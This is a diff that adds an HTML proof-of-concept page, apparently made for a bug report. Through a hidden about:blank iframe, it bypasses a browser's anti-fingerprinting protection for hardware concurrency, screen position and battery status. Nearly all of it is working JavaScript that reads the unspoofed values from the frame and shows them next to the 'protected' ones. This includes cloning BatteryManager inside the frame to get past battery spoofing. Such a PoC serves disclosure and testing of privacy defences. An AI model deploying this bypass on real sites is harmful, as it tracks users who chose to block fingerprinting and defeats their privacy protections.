@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>PoC</title>
+  </head>
+  <body>
+    <div>
+      <p>
+        This poc bypasses the protection for hardware / screen / battery
+        fingerprinting.
+      </p>
+      <p>
+        Please click the buttons below. Also, please start/stop charging. <b>You
+          can compare values acquired by usual fingerprint ("protected") and by
+          one using this technique ("bypassed").</b>
+      </p>
+    </div>
+    <div id="info"></div>
+    <button id="hardware">fingerprint hardware</button>
+    <button id="screen">fingerprint screen</button>
+    <button id="battery">fingerprint battery</button>
+    <script>
+      const info = document.getElementById("info");
+      function addInfo(text) {
+        const p = document.createElement("p");
+        p.textContent = text;
+        info.appendChild(p);
+      }
+
+      const f = document.createElement("iframe");
+      f.src = "about:blank";
+      f.hidden = true;
+      document.documentElement.appendChild(f);
+
+      const hcInFrame = f.contentWindow.navigator.hardwareConcurrency;
+      //////// hardware fingerprint ////////
+      document.getElementById("hardware").addEventListener(
+        "click",
+        () => {
+          // protected fingerprint (not working)
+          addInfo(`protected: ${navigator.hardwareConcurrency}`);
+
+          // bypassed fingerprint (working)
+          addInfo(`bypassed: ${hcInFrame}`);
+        },
+      );
+
+      const atInFrame = f.contentWindow.screen.availTop;
+      //////// screen fingerprint ////////
+      document.getElementById("screen").addEventListener(
+        "click",
+        () => {
+          // protected fingerprint (not working)
+          addInfo(`protected: ${screen.availTop}`);
+
+          // bypassed fingerprint (working)
+          addInfo(`bypassed: ${atInFrame}`);
+        },
+      );
+
+      //////// battery fingerprint ////////
+
+      // preparation
+      f.contentWindow.Function.prototype.clone = function () {
+        var that = this;
+        var temp = function temporary() {
+          return that.apply(this, arguments);
+        };
+        for (var key in this) {
+          if (this.hasOwnProperty(key)) {
+            temp[key] = this[key];
+          }
+        }
+        return temp;
+      };
+      const clonedBatteryManager = f.contentWindow.BatteryManager
+        .clone();
+      f.contentWindow.setTimeout(() => {
+        f.contentWindow.BatteryManager = clonedBatteryManager;
+      }, 500);
+
+      document.getElementById("battery").addEventListener(
+        "click",
+        () => {
+          // protected fingerprint (not working)
+          window.navigator.getBattery().then((i) => {
+            addInfo(
+              `protected: charging: ${i.charging}, chargingTime: ${i.chargingTime}, dischargingTime: ${i.dischargingTime}, level: ${i.level}`,
+            );
+            i.addEventListener("chargingchange", (e) => {
+              addInfo(
+                `protected: charging switched: ${
+                  e.target.charging ? "No -> Yes" : "Yes -> No"
+                }`,
+              );
+            });
+          });
+
+          // bypassed fingerprint (working)
+          f.contentWindow.navigator.getBattery().then((battery) => {
+            addInfo(
+              `bypassed: charging: ${battery.charging}, chargingTime: ${battery.chargingTime}, dischargingTime: ${battery.dischargingTime}, level: ${battery.level}`,
+            );
+            battery.addEventListener("chargingchange", (e) => {
+              addInfo(
+                `bypassed: charging switched: ${
+                  e.target.charging ? "No -> Yes" : "Yes -> No"
+                }`,
+              );
+            });
+          });
+        },
+      );
+    </script>
+  </body>
+</html>
